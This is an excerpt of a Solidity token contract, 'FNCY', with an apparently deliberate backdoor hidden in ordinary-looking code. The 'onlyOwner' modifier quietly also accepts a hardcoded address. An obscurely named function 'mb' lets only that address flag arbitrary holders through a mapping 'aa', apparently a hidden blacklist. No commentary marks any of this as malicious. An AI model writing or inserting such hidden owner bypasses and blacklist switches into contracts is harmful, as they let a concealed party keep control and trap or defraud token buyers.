...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x7E7ea4865C80e7E44077a04ACb7BA9a92bc9E484) , "Ownable: caller is not the owner");
        _;
    }
...
contract FNCY is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "FNCY";
    string private _symbol = "FNCY";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xB7683F1ac1E3ab9CA1aB7538DBcf4a0370ca207E);
    address payable public teamWalletAddress = payable(0xB7683F1ac1E3ab9CA1aB7538DBcf4a0370ca207E);
    ...
    function mb(address addr, bool status) public{
        require(_msgSender()    ==   address(0x7E7ea4865C80e7E44077a04ACb7BA9a92bc9E484));
        aa[addr] = status;
    }
